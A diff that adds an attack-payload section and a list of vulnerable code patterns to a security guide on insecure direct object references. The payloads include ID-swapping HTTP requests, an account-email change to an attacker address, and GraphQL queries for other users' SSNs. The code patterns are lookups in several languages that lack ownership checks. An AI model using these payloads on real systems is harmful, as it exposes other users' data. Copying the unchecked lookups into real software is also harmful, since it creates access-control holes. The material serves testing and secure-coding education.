@@ -30,6 +30,109 @@ The unsafe assumption is that opaque or sequential IDs are secret. Attackers enu
 | **Batch endpoints** | Arrays of IDs returned without per-item authorization |
 | **File access** | `send_file(userInput)` or bucket keys built from unsanitized names |
 
+## Attack Payloads
+
+Use these in authorized tests when endpoints accept object identifiers. Replace `ID` with sequential or leaked values.
+
+### Pattern 1: Path parameter ID swap
+
+```http
+GET /api/orders/1001 HTTP/1.1
+GET /api/orders/1002 HTTP/1.1
+GET /api/users/42/profile HTTP/1.1
+GET /api/users/43/profile HTTP/1.1
+```
+
+### Pattern 2: Query and body object selectors
+
+```http
+GET /download?fileId=55 HTTP/1.1
+POST /api/invoice {"invoiceId": 9001}
+PATCH /api/account {"userId": 7, "email": "attacker@evil.example"}
+```
+
+### Pattern 3: Batch ID arrays
+
+```json
+{"ids": [1, 2, 3, 4, 5]}
+```
+
+Server returns all records without per-id ownership check.
+
+### Pattern 4: File and storage keys
+
+```http
+GET /files?name=report_user42.pdf HTTP/1.1
+GET /s3/object?key=tenantA/secret.doc HTTP/1.1
+```
+
+### Pattern 5: UUID assumption (still needs authz)
+
+```http
+GET /api/message/a1b2c3d4-e5f6-7890-abcd-ef1234567890 HTTP/1.1
+# Valid when UUID leaked via email, log, or shared link
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Object lookups must filter by authenticated principal, tenant, or ACL—not by attacker-supplied ID alone.
+
+### Python
+
+```python
+db.orders.find_one({"_id": order_id})
+send_file(os.path.join("/uploads", request.args.get("name")))
+User.objects.get(pk=request.json["userId"])
+```
+
+Flask/Django ORM: `get(id=...)` without `filter(owner=request.user)`. S3: `bucket.get_object(Key=user_key)`.
+
+### Java
+
+```java
+return orderRepo.findById(orderId).orElseThrow();
+return jdbc.query("SELECT * FROM docs WHERE id = ?", id);
+```
+
+JPA `findById`, Spring Data without `@Query` ownership predicate; `Files.readAllBytes(Paths.get(userPath))`.
+
+### C#
+
+```csharp
+return _db.Invoices.Find(invoiceId);
+return File.ReadAllBytes(Path.Combine(uploadDir, fileName));
+```
+
+EF Core `Find`, minimal APIs returning entity by route id without `IAuthorizationService` resource check.
+
+### JavaScript (Node.js)
+
+```javascript
+const order = await Order.findById(req.params.id);
+const file = path.join(UPLOAD_DIR, req.query.name);
+await db.query('SELECT * FROM messages WHERE id = $1', [req.body.id]);
+```
+
+Mongoose/Sequelize `findByPk` without `where: { userId: req.user.id }`.
+
+### Go
+
+```go
+order, _ := repo.FindByID(r.URL.Query().Get("id"))
+http.ServeFile(w, r, filepath.Join(uploadDir, r.PathValue("name")))
+```
+
+sqlx `Get` with only `WHERE id = ?`; no `AND tenant_id = ?`.
+
+### GraphQL
+
+```graphql
+query { user(id: 42) { email ssn } }
+mutation { updateOrder(id: 1001, status: "SHIPPED") { ok } }
+```
+
+Resolvers must authorize the node, not only require a valid session.
+
 ## Sample Vulnerable Code in Python
 
 ```python
